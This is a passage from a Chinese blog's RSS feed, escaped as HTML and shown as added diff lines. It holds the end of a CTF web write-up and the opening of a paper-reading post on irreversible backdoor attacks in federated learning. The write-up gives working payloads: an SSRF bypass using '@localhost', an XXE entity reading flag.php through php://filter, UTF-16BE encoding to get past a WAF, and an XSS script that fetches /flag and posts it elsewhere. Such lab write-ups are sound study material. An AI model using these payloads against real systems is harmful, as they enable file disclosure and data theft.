+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">session&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;role&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;admin&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s1">&amp;#39;Logged in as admin&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nd">@app.route&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/session&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">def&lt;/span> &lt;span class="nf">show_session&lt;/span>&lt;span class="p">():&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># 显示当前会话信息&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;Current session role: &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">session&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">get&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;role&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;Not logged in&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">if&lt;/span> &lt;span class="vm">__name__&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="s1">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">app&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">run&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">debug&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="kc">True&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>打开本地页面拿到session即可，或者别的脚本也可以&lt;/p>
+&lt;p>根据过滤条件我们很容易发现&lt;code>view_uploads&lt;/code>处有个ssrf，很容易绕过:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">csrf_token&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">IjliOWJjYmFiOTYwNWM4NGY4MjFjYzc1OWQ3Njg2OGZlMTMyNjkzNGYi&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ZyCzUA&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">G0Mp5_49tYfctHqZH2Keox5bYy4&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">www&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">testctf&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">com&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="n">localhost&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">index&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">php&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">user_input&lt;/span>&lt;span class="o">=%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="n">Fvar&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="n">Fwww&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="n">Fhtml&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="n">Fuploads&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="n">F20de556e638eb01cd3e5fdd0a08d4167&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">submit&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">Submit&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>尝试访问index.php，回显：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">The&lt;/span> &lt;span class="n">value&lt;/span> &lt;span class="n">of&lt;/span> &lt;span class="n">user_input&lt;/span> &lt;span class="n">is&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">html&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">uploads&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">20&lt;/span>&lt;span class="n">de556e638eb01cd3e5fdd0a08d4167Failed&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">to&lt;/span> &lt;span class="nb">load&lt;/span> &lt;span class="n">XML&lt;/span> &lt;span class="n">file&lt;/span>&lt;span class="o">.&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>考虑xxe&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-xml" data-lang="xml">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&amp;lt;?xml version=&amp;#34;1.0&amp;#34; ?&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&amp;lt;!DOCTYPE x[
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp"> &amp;lt;!ENTITY k1te SYSTEM &amp;#34;php://filter/convert.base64-encode/resource=flag.php&amp;#34;&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">]&amp;gt;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nt">&amp;lt;person&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nt">&amp;lt;name&amp;gt;&lt;/span>&lt;span class="ni">&amp;amp;k1te;&lt;/span>&lt;span class="nt">&amp;lt;/name&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nt">&amp;lt;/person&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>由于有waf，编码绕过：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">cat payload &lt;span class="p">|&lt;/span> iconv -f utf-8 -t utf-16be &amp;gt; payload.xml
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>flag：&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">The&lt;/span> &lt;span class="n">value&lt;/span> &lt;span class="n">of&lt;/span> &lt;span class="n">user_input&lt;/span> &lt;span class="n">is&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="o">/&lt;/span>&lt;span class="k">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">www&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">html&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">uploads&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">054891&lt;/span>&lt;span class="n">ca373134a47a817ed3be4dc1d6name&lt;/span>&lt;span class="p">:&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">PD9waHAKJGZsYWc9IndkZmxhZ3thdWZod3BwNnRxMTRhbTdiazIzN3BieXl6dzJuZzQ4d30iOwo&lt;/span>&lt;span class="o">=&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>其实应该打一个无回显的，但是刚好撞对了&lt;/p>
+&lt;h3 id="web02">web02
+&lt;/h3>&lt;p>刚开始没去扫目录，导致打cookie打了半天，最后才发现有个/flag路由&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nx">script&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>&lt;span class="nx">fetch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/flag&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="nx">then&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">response&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="nx">response&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">text&lt;/span>&lt;span class="p">())&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">.&lt;/span>&lt;span class="nx">then&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">data&lt;/span> &lt;span class="p">=&amp;gt;&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kd">var&lt;/span> &lt;span class="nx">flag&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">data&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">fetch&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/content/2755d0d0eb060eabc05e8196479af6ba&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">method&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;POST&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">headers&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="s1">&amp;#39;Content-Type&amp;#39;&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="s1">&amp;#39;application/x-www-form-urlencoded&amp;#39;&lt;/span>&lt;span class="p">,&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">},&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nx">body&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="k">new&lt;/span> &lt;span class="nx">URLSearchParams&lt;/span>&lt;span class="p">({&lt;/span> &lt;span class="nx">content&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="nx">flag&lt;/span> &lt;span class="p">})&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">});&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">});&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="err">/script&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div></description></item><item><title>【论文阅读】IBA: Towards Irreversible Backdoor Attacks in Federated Learning</title><link>https://k1te.cn/p/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BBiba-towards-irreversible-backdoor-attacks-in-federated-learning/</link><pubDate>Wed, 23 Oct 2024 13:34:53 +0800</pubDate><guid>https://k1te.cn/p/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BBiba-towards-irreversible-backdoor-attacks-in-federated-learning/</guid><description>&lt;h3 id="info">Info
 &lt;/h3>&lt;p>NeurIPS 2023&lt;/p>
 &lt;p>Vanderbilt University等&lt;/p>
 &lt;p>代码地址：&lt;a class="link" href="https://github.com/sail-research/iba" target="_blank" rel="noopener"
